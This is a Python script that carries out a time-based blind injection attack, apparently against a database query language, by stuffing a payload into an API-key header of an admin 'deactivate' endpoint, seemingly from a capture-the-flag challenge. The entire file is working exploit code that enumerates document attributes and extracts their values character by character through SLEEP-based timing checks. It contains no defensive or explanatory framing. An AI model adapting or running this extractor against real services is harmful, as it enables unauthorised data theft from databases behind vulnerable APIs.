import requests
import logging
import time
import json

logging.basicConfig()

BASE_URL     = "https://api.frostbit.app/api/v1/frostbitadmin/bot/3da17f67-ee61-455d-afc2-aa20e8c7911e/deactivate?debug=true"
BASE_QUERY   = "' || {}?SLEEP(1000):false || '"
HEADER       = "X-API-Key"
OK_MSG       = 'Timeout or error in query:'

INT_RETRY_THRESHOLD = 100
HEX_ALPHABET = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]

LOG_LEVEL    = logging.INFO

logger       = logging.getLogger("")

def runBlind (query):
  query = BASE_QUERY.format(query)
  headers = {"X-API-Key":query}

  start = time.perf_counter()
  response = requests.get(BASE_URL, headers = headers)
  request_time = time.perf_counter() - start

  logger.debug ("runBlind --> Query: {}".format(query))
  logger.debug ("runBlind --> response.text: {}".format(repr(response.text)))
  logger.debug ("runBlind --> Query took {} seconds".format(request_time))
  if OK_MSG in response.text:
    logger.debug ("runBlind --> Success")
    return True
  else:
    logger.debug ("runBlind --> Failed")
    return False

def runIntBlind (query):
  tresholdTriggered = False
  i = 0
  while True:
    _query = "{}=={}".format(query,i)
    logger.debug ("runIntBlind --> {}".format(i))
    result = runBlind(_query)
    if tresholdTriggered:
      result = result or runBlind(_query)
    if result:
      logger.debug ("runIntBlind --> Return {}".format(i))
      return i
    if i > INT_RETRY_THRESHOLD:
      logger.debug ("runIntBlind --> Counter over threshold, restarting with increased retries")
      i = -1
    i += 1

def runHexBlind (query):
  query = "TO_HEX({})".format(query)

  _query = "LENGTH({})".format(query)
  length = runIntBlind (_query)
  logger.debug ("runHexBlind --> Lenght is {}".format(length))

  hexString = ""
  for i in range (0, length):
    found = False
    j = 0
    while not found:
      hexChar = HEX_ALPHABET[j % len(HEX_ALPHABET)]
      _query = 'SUBSTRING({},{},1)=="{}"'.format(query, i, hexChar)
      if runBlind (_query):
        hexString += hexChar
        found = True
        logger.debug ("runHexBlind --> Current hex string is {}".format(hexString))
      j += 1
  string = bytes.fromhex(hexString).decode("ASCII")
  logger.debug("runHexBlind --> Got {} [{}]".format(string, hexString))
  return string

def getCols ():
  query = "ATTRIBUTES(doc)"
  cols = json.loads(runHexBlind (query))
  logger.debug("getCols --> cols is {}".format(cols))
  return cols

def getNumberOfCols ():
  query = "COUNT(doc)"
  numberOfCols = runIntBlind (query)
  return numberOfCols

def getColsValues (cols):
  table = {}
  for col in cols:
    query = "doc.{}".format(col)
    colValue = runHexBlind(query)
    table[col] = colValue
  return table

def main ():
  print ("### Setup ###")
  print ("Base URL                 : {}".format(BASE_URL))
  print ("Base Query               : {}".format(BASE_QUERY))
  print ("Headers to inject        : {}".format(HEADER))
  print ("OK message               : {}".format(OK_MSG))
  print ("Log level                : {}".format(LOG_LEVEL))
  print ("### Run ###")

  logger.setLevel(LOG_LEVEL)

  print ("Retrieving the number of columns")
  numberOfCols = getNumberOfCols()
  print (" --> Got {} columns".format(numberOfCols))
  print ("Retrieving the columns")
  cols = getCols()
  print (" --> The columns are {}".format(cols))
  print ("Retrieving the values")
  colsValues = getColsValues (cols)
  print (" --> The values are {}".format(colsValues))

if __name__ == "__main__":
  main()